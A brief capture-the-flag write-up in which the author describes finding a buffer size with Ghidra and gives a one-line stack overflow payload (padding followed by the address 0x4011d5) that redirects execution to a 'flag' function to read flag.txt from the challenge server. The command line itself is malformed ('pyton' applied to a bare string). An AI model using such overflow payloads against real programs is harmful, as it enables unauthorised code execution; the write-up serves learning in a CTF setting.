Disassembled with ghidra the bin file and checked that the buffer was 216 locally (208 on server). So i just used the command

```
pyton "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd5\x11\x40\x00\x00\x00\x00\x00"
```
To trigger it + make it run the function flag (address 0x04011d5) to theg the flag.txt from the server
